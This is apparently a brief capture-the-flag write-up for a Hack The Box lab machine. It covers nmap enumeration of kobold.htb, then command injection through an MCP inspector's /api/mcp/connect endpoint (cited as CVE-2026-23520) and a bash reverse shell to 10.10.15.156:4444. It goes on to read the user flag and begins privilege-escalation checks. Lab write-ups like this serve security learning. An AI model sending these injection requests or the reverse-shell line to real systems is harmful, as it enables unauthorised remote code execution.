network enumeration:

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http      nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp  open  ssl/http  nginx 1.24.0 (Ubuntu)
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_http-title: Did not follow redirect to https://kobold.htb/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
3552/tcp open  taserver?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Sun, 22 Mar 2026 10:05:34 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|_    <link rel="modu
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3552-TCP:V=7.94SVN%I=7%D=3/22%Time=69BFBEEE%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Range
SF:s:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalid
SF:ate\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Sun,\x2022\
SF:x20Mar\x202026\x2010:05:34\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20l
SF:ang=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<m
SF:eta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,
SF:\x20must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20cont
SF:ent=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=
SF:\"0\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favico
SF:n\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20
SF:/>\n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n
SF:\t\t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x
SF:20media=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name
SF:=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x
SF:20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x2
SF:0rel=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Range
SF:s:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalid
SF:ate\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Sun,\x2022\
SF:x20Mar\x202026\x2010:05:34\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20l
SF:ang=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<m
SF:eta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,
SF:\x20must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20cont
SF:ent=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=
SF:\"0\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favico
SF:n\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20
SF:/>\n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n
SF:\t\t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x
SF:20media=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name
SF:=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x
SF:20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x2
SF:0rel=\"modu");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

then subdomain enumeration i got `mcp.kobold.ntb` then found the cve related to it CVE-2026-23520. 

```
POST /api/mcp/connect HTTP/1.1
Host: mcp.kobold.htb

{
  "serverConfig": {
    "command": "sleep",
    "args": ["5"]
  },
  "serverId": "test"
}

i think it works
```

```
{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.15.156/4444 0>&1"]
  },
  "serverId": "pwned"
}

got the shell:

ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
<e_modules/@mcpjam/inspector$ cat /home/ben/user.txt
8ca2833835371c3d977200a6d0c01404
```

privllage excllation:

```
ben@kobold:~$ id
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
ben@kobold:~$ groups
groups
ben operator

```